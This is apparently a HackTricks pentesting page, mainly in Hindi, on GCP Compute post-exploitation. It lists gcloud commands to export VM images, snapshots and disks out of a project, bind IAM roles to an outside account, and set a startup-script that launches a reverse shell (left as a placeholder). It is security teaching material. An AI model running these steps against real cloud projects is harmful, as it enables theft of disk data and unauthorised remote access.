# GCP - Compute Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Compute

Compute और VPC (Networking) के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-compute-instances-enum/
{{#endref}}

### स्थानीय रूप से छवियों का निर्यात और निरीक्षण करें

यह एक हमलावर को **पहले से मौजूद छवियों के अंदर निहित डेटा तक पहुँचने** या **चल रहे VMs की नई छवियाँ बनाने** और उनके डेटा तक पहुँचने की अनुमति देगा बिना चल रहे VM तक पहुँच के।

एक VM छवि को एक बकेट में निर्यात करना और फिर इसे डाउनलोड करना और स्थानीय रूप से माउंट करना संभव है, कमांड के साथ:
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
Fore performing this action the attacker might need privileges over the storage bucket and for sure **privileges over cloudbuild** as it's the **service** which is going to be asked to perform the export\
Moreover, for this to work the codebuild SA and the compute SA needs privileged permissions.\
The cloudbuild SA `<project-id>@cloudbuild.gserviceaccount.com` needs:

- roles/iam.serviceAccountTokenCreator
- roles/compute.admin
- roles/iam.serviceAccountUser

And the SA `<project-id>-compute@developer.gserviceaccount.com` needs:

- oles/compute.storageAdmin
- roles/storage.objectAdmin

### Export & Inspect Snapshots & Disks locally

यह संभव नहीं है कि सीधे स्नैपशॉट और डिस्क को निर्यात किया जाए, लेकिन यह संभव है कि **एक स्नैपशॉट को एक डिस्क में, एक डिस्क को एक इमेज में** परिवर्तित किया जाए और **पिछले अनुभाग** का पालन करते हुए, उस इमेज को निर्यात किया जाए ताकि इसे स्थानीय रूप से निरीक्षण किया जा सके।
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
### Inspect an Image creating a VM

**छवि में संग्रहीत डेटा** या **चल रहे VM** के अंदर से, जहाँ एक हमलावर **एक छवि बनाई है,** तक पहुँच प्राप्त करने के लक्ष्य के साथ, एक बाहरी खाते को छवि पर पहुँच प्रदान करना संभव है:
```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```
और फिर इससे एक नया VM बनाएं:
```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```
यदि आप अपनी बाहरी खाता छवि के माध्यम से पहुंच नहीं दे सके, तो आप पीड़ित की परियोजना में उस छवि का उपयोग करके एक VM लॉन्च कर सकते हैं और **मेटाडेटा को एक रिवर्स शेल निष्पादित करने के लिए बना सकते हैं** छवि तक पहुंच प्राप्त करने के लिए पैरामीटर जोड़ते हुए:
```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```
### Inspect a Snapshot/Disk attaching it to a VM

**डिस्क या स्नैपशॉट में संग्रहीत डेटा तक पहुँचने के लक्ष्य के साथ, आप स्नैपशॉट को डिस्क में, डिस्क को इमेज में बदल सकते हैं और पिछले चरणों का पालन कर सकते हैं।**

या आप **एक बाहरी खाते को डिस्क पर पहुँच प्रदान कर सकते हैं** (यदि प्रारंभिक बिंदु एक स्नैपशॉट है तो स्नैपशॉट पर पहुँच दें या इससे एक डिस्क बनाएं):
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```
**डिस्क** को एक उदाहरण से जोड़ें:
```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```
Mount the disk inside the VM:

1.  **SSH into the VM**:

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```

2.  **Disk की पहचान करें**: Once inside the VM, identify the new disk by listing the disk devices. Typically, you can find it as `/dev/sdb`, `/dev/sdc`, etc.
3.  **Disk को फॉर्मेट और माउंट करें** (if it's a new or raw disk):

- एक माउंट पॉइंट बनाएं:

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```

- Disk को माउंट करें:

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

If you **cannot give access to a external project** to the snapshot or disk, you might need to p**erform these actions inside an instance in the same project as the snapshot/disk**.

{{#include ../../../banners/hacktricks-training.md}}
